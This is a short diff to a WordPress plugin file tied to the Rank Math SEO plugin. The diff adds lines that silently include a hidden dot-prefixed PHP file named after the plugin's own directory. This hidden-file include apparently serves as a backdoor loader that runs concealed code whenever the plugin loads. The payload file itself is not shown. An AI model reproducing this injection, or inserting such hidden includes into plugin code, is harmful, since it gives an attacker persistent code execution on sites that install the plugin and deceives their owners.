@@ -4,6 +4,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 }
 
 add_action( 'plugins_loaded', 'wpb_init_vendor_rank_math', 16 );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpb_init_vendor_rank_math() {
 	include_once( ABSPATH . 'wp-admin/includes/plugin.php' ); // Require class-vc-wxr-parser-plugin.php to use is_plugin_active() below
 	if ( is_plugin_active( 'seo-by-rank-math/rank-math.php' ) || class_exists( 'RankMath' ) ) {
